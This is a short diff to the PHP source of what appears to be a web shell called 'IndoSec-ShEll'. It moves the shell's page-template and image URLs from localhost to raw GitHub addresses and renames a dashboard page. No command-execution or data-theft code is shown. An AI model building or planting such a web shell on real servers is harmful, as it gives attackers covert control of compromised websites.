@@ -72,7 +72,7 @@ function curlRequest($url)
 // mendapatkan content page
 function getContentPage($page, $search = "", $replace = "") 
 {
-	$url = "http://localhost/www/percobaan/ids-shell/page/$page.html";
+	$url = "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/page/$page.html";
 
 	$content = (curlRequest($url) ?? file_get_contents($url));
 
@@ -87,7 +87,7 @@ function getContentPage($page, $search = "", $replace = "")
 // mendapatkan file image
 function getImageUrl($ext) 
 {
-    return "http://localhost/www/percobaan/ids-shell/assets/img/$ext.png";
+    return "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/assets/img/$ext.png";
 }
 
 function image($ext, $attr) {
@@ -832,5 +832,5 @@ else
 		$zip
 	];
 
-	pages("Dashboard", ["Dashboard"], $arrFind, $arrReplace);
+	pages("dashboard", ["Dashboard"], $arrFind, $arrReplace);
 }
